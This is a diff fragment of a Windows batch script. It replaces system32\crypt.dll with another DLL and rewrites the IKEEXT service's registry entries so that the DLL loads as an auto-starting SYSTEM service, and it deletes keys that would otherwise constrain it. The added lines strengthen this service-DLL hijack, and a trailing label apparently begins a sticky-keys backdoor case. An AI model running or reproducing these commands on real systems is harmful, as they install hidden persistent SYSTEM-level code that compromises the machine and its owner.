@@ -83,13 +83,15 @@ del touch.exe
 del ditto.exe
 del c:\windows\system32\crypt.dll
 move /y updll64.dll c:\windows\system32\crypt.dll
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v ImagePath /t REG_EXPAND_SZ /d "%systemroot%\system32\svchost.exe -k netsvcs -p" /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\crypt.dll" /f
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v Start /t REG_DWORD /d 2 /f
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\TriggerInfo" /f
+reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceDllUnloadOnStop /f
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT\Parameters" /v ServiceMain /f
 reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\IKEEXT" /v DependOnService /f
 sc config IKEEXT start= auto
-sc start IKEEXT
+start sc start IKEEXT
 GOTO DEFAULT
 
 :CASE_sticky
